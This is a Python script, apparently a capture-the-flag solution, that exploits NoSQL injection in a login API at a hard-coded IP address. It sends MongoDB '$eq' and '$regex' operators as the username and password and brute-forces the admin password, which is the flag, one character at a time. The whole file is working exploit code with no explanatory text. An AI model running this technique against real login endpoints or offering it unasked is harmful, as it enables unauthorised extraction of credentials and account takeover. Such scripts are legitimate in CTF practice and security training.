#!/usr/bin/env python3

import json
import requests as req
from string import printable
from typing import *

printable = printable[:printable.index(' ')]
URL = 'http://46.101.22.121:31559/api/login'
SPECIAL = '()*+[]\\^${}.?'

def test(uname: Any, pwd: Any) -> bool:
    return json.loads(req.post(URL, json={'username': uname, 'password': pwd,}).text)['logged']

def main():
    uname: Any = {'$eq': 'admin'}
    pwd: str = 'CHTB'

    while not pwd.endswith('}'):
        for c in printable:
            c = f'\\{c}' if c in SPECIAL else c
            cu: str = pwd + c
            print(f'\r[*] {cu} ... ', end='')
            if test(uname, {'$regex': f'^{cu}',}):
                pwd += c
                print(f'\r[*] Flag = {pwd} ... ')
                break
    print()

if __name__ == '__main__':
    main()
